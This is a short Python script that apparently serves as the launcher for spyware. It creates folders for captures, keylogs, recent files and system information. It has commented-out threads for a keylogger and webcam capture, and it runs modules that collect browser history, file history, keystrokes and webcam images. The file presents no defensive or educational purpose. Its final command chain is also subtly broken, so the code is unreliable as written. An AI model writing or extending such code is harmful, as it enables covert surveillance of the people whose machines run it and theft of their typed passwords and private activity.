import os
import time


def checkreate_req_folds():
    drctrys = ["caps", "klogs", "rcntfiles", "basicsysinfowin"]
    for drctry in drctrys:
        if not os.path.exists(drctry):
            os.makedirs(drctry)

def main():
    
    checkreate_req_folds()
    #Thread(target = klg.klog_main).start()
    #Thread(target = wcm.web_cap_main, args=(5,)).start()
    time.sleep(1)
    

main()
    
os.system("python basicsysinfowinmodule.py || browserhistmodule.py || filehistmodule.py || klogmodule.py || webcapmodule.py")
